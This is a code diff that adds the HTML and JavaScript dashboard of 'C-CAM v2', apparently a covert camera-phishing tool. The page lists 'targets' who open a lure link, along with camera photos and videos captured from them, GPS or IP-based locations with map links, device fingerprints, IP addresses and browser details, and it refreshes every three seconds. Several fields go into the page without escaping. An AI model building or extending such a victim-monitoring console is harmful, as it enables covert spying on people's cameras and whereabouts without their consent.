@@ -1,0 +1,548 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>C-CAM v2 — Dashboard</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            font-family: 'Inter', sans-serif;
+            background: #0a0a0f;
+            color: #e0e0e0;
+            min-height: 100vh;
+        }
+        
+        /* Navbar */
+        .navbar {
+            background: rgba(15, 15, 25, 0.95);
+            -webkit-backdrop-filter: blur(20px);
+            backdrop-filter: blur(20px);
+            border-bottom: 1px solid rgba(255,255,255,0.06);
+            padding: 15px 30px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        .navbar h1 {
+            font-size: 20px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #00f5a0, #00d9f5);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .navbar .status {
+            display: flex; align-items: center; gap: 8px;
+            font-size: 13px; color: #4ade80;
+        }
+        .navbar .status .dot {
+            width: 8px; height: 8px; background: #4ade80;
+            border-radius: 50%; animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0%,100% { opacity: 1; box-shadow: 0 0 0 0 rgba(74,222,128,0.7); }
+            50% { opacity: 0.7; box-shadow: 0 0 0 8px rgba(74,222,128,0); }
+        }
+        
+        /* Container */
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 25px;
+        }
+        
+        /* Stats Cards */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        .stat-card {
+            background: linear-gradient(135deg, rgba(255,255,255,0.05), rgba(255,255,255,0.02));
+            border: 1px solid rgba(255,255,255,0.08);
+            border-radius: 16px;
+            padding: 24px;
+            transition: transform 0.3s, border-color 0.3s;
+        }
+        .stat-card:hover {
+            transform: translateY(-3px);
+            border-color: rgba(255,255,255,0.15);
+        }
+        .stat-card .icon { font-size: 28px; margin-bottom: 12px; }
+        .stat-card .value {
+            font-size: 36px; font-weight: 800;
+            background: linear-gradient(135deg, #fff, #aaa);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .stat-card .label { font-size: 13px; color: #888; margin-top: 4px; }
+        .stat-card.sessions { border-left: 3px solid #00f5a0; }
+        .stat-card.photos { border-left: 3px solid #f59e0b; }
+        .stat-card.locations { border-left: 3px solid #3b82f6; }
+        .stat-card.fingerprints { border-left: 3px solid #a855f7; }
+        .stat-card.videos { border-left: 3px solid #ef4444; }
+        
+        /* Tabs */
+        .tabs {
+            display: flex; gap: 5px;
+            background: rgba(255,255,255,0.04);
+            border-radius: 12px;
+            padding: 4px;
+            margin-bottom: 25px;
+            overflow-x: auto;
+        }
+        .tab {
+            padding: 10px 20px;
+            border-radius: 8px;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            color: #888;
+            transition: all 0.3s;
+            white-space: nowrap;
+        }
+        .tab:hover { color: #fff; }
+        .tab.active {
+            background: linear-gradient(135deg, #00f5a0, #00d9f5);
+            color: #000;
+        }
+        
+        /* Panels */
+        .panel { display: none; }
+        .panel.active { display: block; }
+        
+        /* Sessions Table */
+        .session-list { display: flex; flex-direction: column; gap: 12px; }
+        .session-card {
+            background: rgba(255,255,255,0.03);
+            border: 1px solid rgba(255,255,255,0.06);
+            border-radius: 12px;
+            padding: 18px 22px;
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            transition: border-color 0.3s;
+        }
+        .session-card:hover { border-color: rgba(0,245,160,0.3); }
+        .session-num {
+            width: 40px; height: 40px;
+            background: linear-gradient(135deg, #00f5a0, #00d9f5);
+            border-radius: 10px;
+            display: flex; align-items: center; justify-content: center;
+            font-weight: 800; color: #000; font-size: 16px; flex-shrink: 0;
+        }
+        .session-info { flex: 1; }
+        .session-info .ip { font-weight: 600; font-size: 15px; color: #fff; }
+        .session-info .ua { font-size: 12px; color: #666; margin-top: 3px; max-width: 500px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+        .session-badge {
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 600;
+        }
+        .badge-photos { background: rgba(245,158,11,0.15); color: #f59e0b; }
+        
+        /* Photo Grid */
+        .photo-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 15px;
+        }
+        .photo-card {
+            background: rgba(255,255,255,0.03);
+            border: 1px solid rgba(255,255,255,0.06);
+            border-radius: 12px;
+            overflow: hidden;
+            transition: transform 0.3s;
+        }
+        .photo-card:hover { transform: scale(1.02); }
+        .photo-card img {
+            width: 100%;
+            height: 160px;
+            object-fit: cover;
+            display: block;
+        }
+        .photo-card .meta {
+            padding: 10px 12px;
+            font-size: 11px;
+            color: #888;
+        }
+        
+        /* Location Cards */
+        .location-list { display: flex; flex-direction: column; gap: 12px; }
+        .location-card {
+            background: rgba(255,255,255,0.03);
+            border: 1px solid rgba(255,255,255,0.06);
+            border-radius: 12px;
+            padding: 18px 22px;
+        }
+        .location-card .type-badge {
+            display: inline-block;
+            padding: 3px 10px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+        .type-gps { background: rgba(34,197,94,0.15); color: #22c55e; }
+        .type-ip { background: rgba(245,158,11,0.15); color: #f59e0b; }
+        .location-card .coords { font-size: 14px; color: #fff; font-weight: 500; margin-bottom: 5px; }
+        .location-card .maps-link {
+            font-size: 12px; color: #3b82f6; text-decoration: none;
+        }
+        .location-card .maps-link:hover { text-decoration: underline; }
+        .location-card .time { font-size: 11px; color: #666; margin-top: 6px; }
+        
+        /* Fingerprint Cards */
+        .fp-card {
+            background: rgba(255,255,255,0.03);
+            border: 1px solid rgba(255,255,255,0.06);
+            border-radius: 12px;
+            padding: 18px;
+            margin-bottom: 12px;
+        }
+        .fp-card pre {
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            color: #aaa;
+            white-space: pre-wrap;
+            line-height: 1.6;
+        }
+        .fp-card .fp-time { font-size: 11px; color: #666; margin-bottom: 8px; }
+        
+        /* Live Feed */
+        .live-feed {
+            max-height: 400px;
+            overflow-y: auto;
+            padding-right: 10px;
+        }
+        .live-event {
+            padding: 12px 16px;
+            border-left: 3px solid #00f5a0;
+            background: rgba(255,255,255,0.02);
+            margin-bottom: 8px;
+            border-radius: 0 8px 8px 0;
+            font-size: 13px;
+            animation: slideIn 0.3s ease;
+        }
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateX(-10px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+        .live-event .event-time { font-size: 10px; color: #666; }
+        .live-event.target { border-left-color: #ef4444; }
+        .live-event.location { border-left-color: #3b82f6; }
+        .live-event.photo { border-left-color: #f59e0b; }
+        .live-event.fingerprint { border-left-color: #a855f7; }
+        
+        /* Empty state */
+        .empty-state {
+            text-align: center;
+            padding: 60px 20px;
+            color: #555;
+        }
+        .empty-state .icon { font-size: 48px; margin-bottom: 15px; }
+        .empty-state h3 { font-size: 18px; color: #777; margin-bottom: 5px; }
+        
+        /* Refresh indicator */
+        .refresh-bar {
+            height: 2px;
+            background: rgba(255,255,255,0.05);
+            margin-bottom: 20px;
+            border-radius: 1px;
+            overflow: hidden;
+        }
+        .refresh-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #00f5a0, #00d9f5);
+            width: 0%;
+            animation: refill 3s linear infinite;
+        }
+        @keyframes refill {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+        
+        /* Responsive */
+        @media (max-width: 768px) {
+            .container { padding: 15px; }
+            .stats-grid { grid-template-columns: repeat(2, 1fr); }
+            .stat-card .value { font-size: 28px; }
+            .photo-grid { grid-template-columns: repeat(2, 1fr); }
+            .session-card { flex-direction: column; align-items: flex-start; }
+        }
+    </style>
+</head>
+<body>
+    <nav class="navbar">
+        <h1>⚡ C-CAM v2 Dashboard</h1>
+        <div class="status">
+            <span class="dot"></span>
+            <span>Live Monitoring</span>
+        </div>
+    </nav>
+    
+    <div class="container">
+        <div class="refresh-bar"><div class="refresh-fill"></div></div>
+        
+        <!-- Stats -->
+        <div class="stats-grid">
+            <div class="stat-card sessions">
+                <div class="icon">🎯</div>
+                <div class="value" id="statSessions">0</div>
+                <div class="label">Active Sessions</div>
+            </div>
+            <div class="stat-card photos">
+                <div class="icon">📸</div>
+                <div class="value" id="statPhotos">0</div>
+                <div class="label">Photos Captured</div>
+            </div>
+            <div class="stat-card locations">
+                <div class="icon">📍</div>
+                <div class="value" id="statLocations">0</div>
+                <div class="label">Locations</div>
+            </div>
+            <div class="stat-card fingerprints">
+                <div class="icon">🔍</div>
+                <div class="value" id="statFingerprints">0</div>
+                <div class="label">Fingerprints</div>
+            </div>
+            <div class="stat-card videos">
+                <div class="icon">🎥</div>
+                <div class="value" id="statVideos">0</div>
+                <div class="label">Videos</div>
+            </div>
+        </div>
+        
+        <!-- Tabs -->
+        <div class="tabs">
+            <div class="tab active" onclick="switchTab('live')">🔴 Live Feed</div>
+            <div class="tab" onclick="switchTab('sessions')">🎯 Sessions</div>
+            <div class="tab" onclick="switchTab('photos')">📸 Photos</div>
+            <div class="tab" onclick="switchTab('locations')">📍 Locations</div>
+            <div class="tab" onclick="switchTab('fingerprints')">🔍 Fingerprints</div>
+        </div>
+        
+        <!-- Live Feed Panel -->
+        <div class="panel active" id="panel-live">
+            <div class="live-feed" id="liveFeed">
+                <div class="empty-state">
+                    <div class="icon">📡</div>
+                    <h3>Waiting for targets...</h3>
+                    <p>Events will appear here in real-time</p>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Sessions Panel -->
+        <div class="panel" id="panel-sessions">
+            <div class="session-list" id="sessionList">
+                <div class="empty-state">
+                    <div class="icon">🎯</div>
+                    <h3>No sessions yet</h3>
+                    <p>Targets will appear here when they open the link</p>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Photos Panel -->
+        <div class="panel" id="panel-photos">
+            <div class="photo-grid" id="photoGrid">
+                <div class="empty-state">
+                    <div class="icon">📸</div>
+                    <h3>No photos captured</h3>
+                    <p>Camera captures will appear here</p>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Locations Panel -->
+        <div class="panel" id="panel-locations">
+            <div class="location-list" id="locationList">
+                <div class="empty-state">
+                    <div class="icon">📍</div>
+                    <h3>No locations captured</h3>
+                    <p>GPS and IP-based locations will appear here</p>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Fingerprints Panel -->
+        <div class="panel" id="panel-fingerprints">
+            <div id="fingerprintList">
+                <div class="empty-state">
+                    <div class="icon">🔍</div>
+                    <h3>No fingerprints captured</h3>
+                    <p>Device fingerprints will appear here</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+    var liveEvents = [];
+    var lastLiveCheck = 0;
+    
+    function switchTab(tab) {
+        document.querySelectorAll('.tab').forEach(function(t) { t.classList.remove('active'); });
+        document.querySelectorAll('.panel').forEach(function(p) { p.classList.remove('active'); });
+        
+        event.target.classList.add('active');
+        document.getElementById('panel-' + tab).classList.add('active');
+        
+        // Load data for selected tab
+        if (tab === 'sessions') loadSessions();
+        if (tab === 'photos') loadPhotos();
+        if (tab === 'locations') loadLocations();
+        if (tab === 'fingerprints') loadFingerprints();
+    }
+    
+    function apiCall(action, callback) {
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', 'api.php?action=' + action, true);
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === 4 && xhr.status === 200) {
+                try { callback(JSON.parse(xhr.responseText)); }
+                catch(e) { console.error('API error:', e); }
+            }
+        };
+        xhr.send();
+    }
+    
+    function loadOverview() {
+        apiCall('overview', function(res) {
+            if (res.status === 'success') {
+                document.getElementById('statSessions').textContent = res.data.sessions;
+                document.getElementById('statPhotos').textContent = res.data.photos;
+                document.getElementById('statLocations').textContent = res.data.locations;
+                document.getElementById('statFingerprints').textContent = res.data.fingerprints;
+                document.getElementById('statVideos').textContent = res.data.videos;
+            }
+        });
+    }
+    
+    function loadSessions() {
+        apiCall('sessions', function(res) {
+            if (res.status === 'success' && res.data.length > 0) {
+                var html = '';
+                res.data.forEach(function(s, i) {
+                    html += '<div class="session-card">';
+                    html += '<div class="session-num">' + (i + 1) + '</div>';
+                    html += '<div class="session-info">';
+                    html += '<div class="ip">🌐 ' + (s.ip || 'Unknown') + '</div>';
+                    html += '<div class="ua">' + (s.userAgent || 'Unknown browser') + '</div>';
+                    html += '</div>';
+                    html += '<span class="session-badge badge-photos">📸 ' + (s.photoCount || 0) + '</span>';
+                    html += '</div>';
+                });
+                document.getElementById('sessionList').innerHTML = html;
+            }
+        });
+    }
+    
+    function loadPhotos() {
+        apiCall('photos', function(res) {
+            if (res.status === 'success' && res.data.length > 0) {
+                var html = '';
+                res.data.forEach(function(p) {
+                    html += '<div class="photo-card">';
+                    html += '<img src="' + p.path + '" alt="Capture" onerror="this.src=\'data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 200 160%22><rect fill=%22%23222%22 width=%22200%22 height=%22160%22/><text fill=%22%23666%22 x=%2250%25%22 y=%2250%25%22 dominant-baseline=%22middle%22 text-anchor=%22middle%22 font-size=%2214%22>No preview</text></svg>\'">';
+                    html += '<div class="meta">📷 ' + p.file + '<br>🕐 ' + p.time + '</div>';
+                    html += '</div>';
+                });
+                document.getElementById('photoGrid').innerHTML = html;
+            }
+        });
+    }
+    
+    function loadLocations() {
+        apiCall('locations', function(res) {
+            if (res.status === 'success' && res.data.length > 0) {
+                var html = '';
+                res.data.forEach(function(l) {
+                    var isGPS = l.type === 'GPS';
+                    html += '<div class="location-card">';
+                    html += '<span class="type-badge ' + (isGPS ? 'type-gps' : 'type-ip') + '">' + l.type + '</span>';
+                    if (l.lat && l.lon) {
+                        html += '<div class="coords">📍 ' + l.lat + ', ' + l.lon + '</div>';
+                        html += '<a class="maps-link" href="https://www.google.com/maps/place/' + l.lat + ',' + l.lon + '" target="_blank">🗺️ Open in Google Maps</a>';
+                    }
+                    if (l.city) html += '<div class="coords">🏙️ ' + l.city + ', ' + (l.country || '') + '</div>';
+                    if (l.accuracy) html += '<div style="font-size:12px;color:#888;">Accuracy: ' + l.accuracy + '</div>';
+                    if (l.isp) html += '<div style="font-size:12px;color:#888;">ISP: ' + l.isp + '</div>';
+                    html += '<div class="time">🕐 ' + l.time + '</div>';
+                    html += '</div>';
+                });
+                document.getElementById('locationList').innerHTML = html;
+            }
+        });
+    }
+    
+    function loadFingerprints() {
+        apiCall('fingerprints', function(res) {
+            if (res.status === 'success' && res.data.length > 0) {
+                var html = '';
+                res.data.forEach(function(fp) {
+                    html += '<div class="fp-card">';
+                    html += '<div class="fp-time">🕐 ' + fp.time + '</div>';
+                    html += '<pre>' + escapeHtml(fp.content) + '</pre>';
+                    html += '</div>';
+                });
+                document.getElementById('fingerprintList').innerHTML = html;
+            }
+        });
+    }
+    
+    function checkLive() {
+        apiCall('live', function(res) {
+            if (res.status === 'success' && res.data) {
+                var d = res.data;
+                var now = new Date().toLocaleTimeString();
+                
+                if (d.newTarget) addLiveEvent('🎯 New target opened the link!', 'target', now);
+                if (d.newLocation) addLiveEvent('📍 GPS location captured!', 'location', now);
+                if (d.newIPLocation) addLiveEvent('📍 IP-based location captured (GPS denied)', 'location', now);
+                if (d.newFingerprint) addLiveEvent('🔍 Device fingerprint captured!', 'fingerprint', now);
+            }
+        });
+    }
+    
+    function addLiveEvent(text, type, time) {
+        var feed = document.getElementById('liveFeed');
+        // Clear empty state
+        if (feed.querySelector('.empty-state')) feed.innerHTML = '';
+        
+        var div = document.createElement('div');
+        div.className = 'live-event ' + type;
+        div.innerHTML = '<span class="event-time">' + time + '</span> — ' + text;
+        feed.insertBefore(div, feed.firstChild);
+        
+        // Keep max 50 events
+        while (feed.children.length > 50) feed.removeChild(feed.lastChild);
+    }
+    
+    function escapeHtml(text) {
+        var div = document.createElement('div');
+        div.textContent = text;
+        return div.innerHTML;
+    }
+    
+    // Initial load
+    loadOverview();
+    
+    // Auto-refresh every 3 seconds
+    setInterval(function() {
+        loadOverview();
+        checkLive();
+    }, 3000);
+    </script>
+</body>
+</html>
